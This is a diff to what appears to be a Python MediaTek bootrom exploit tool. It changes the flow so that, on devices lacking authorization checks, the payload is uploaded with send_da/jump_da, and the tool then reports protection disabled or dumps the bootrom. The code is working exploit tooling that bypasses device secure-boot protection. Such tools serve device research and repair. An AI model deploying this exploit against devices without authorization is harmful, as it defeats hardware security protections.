@@ -83,10 +83,12 @@ def main():
     log("Disabling watchdog timer")
     device.write32(config.watchdog_address, 0x22000064)
 
+    payload = prepare_payload(config)
+
+    result = False
+
     if serial_link_authorization or download_agent_authorization:
         log("Disabling protection")
-
-        payload = prepare_payload(config)
 
         result = exploit(device, config.watchdog_address, config.payload_address, config.var_0, config.var_1, payload)
         if arguments.test:
@@ -98,15 +100,26 @@ def main():
                 device.handshake()
                 result = exploit(device, config.watchdog_address, config.payload_address,
                                  config.var_0, config.var_1, payload)
+    else:
+        log("Insecure device, sending payload using send_da")
 
-        bootrom__name = "bootrom_" + hex(hw_code)[2:] + ".bin"
+        payload += b'\x00' * 0x100
 
-        if result == to_bytes(0xA1A2A3A4, 4):
-            log("Protection disabled")
-        elif result == to_bytes(0xC1C2C3C4, 4):
-            dump_brom(device, bootrom__name)
-        elif result == to_bytes(0x0000C1C2, 4) and device.read(4) == to_bytes(0xC1C2C3C4, 4):
-            dump_brom(device, bootrom__name, True)
+        device.send_da(config.payload_address, len(payload), 0x100, payload)
+        device.jump_da(config.payload_address)
+
+        result = device.read(4)
+
+    bootrom__name = "bootrom_" + hex(hw_code)[2:] + ".bin"
+
+    if result == to_bytes(0xA1A2A3A4, 4):
+        log("Protection disabled")
+    elif result == to_bytes(0xC1C2C3C4, 4):
+        dump_brom(device, bootrom__name)
+    elif result == to_bytes(0x0000C1C2, 4) and device.read(4) == to_bytes(0xC1C2C3C4, 4):
+        dump_brom(device, bootrom__name, True)
+    else:
+        log("Payload did not reply")
 
 
 def dump_brom(device, bootrom__name, word_mode=False):
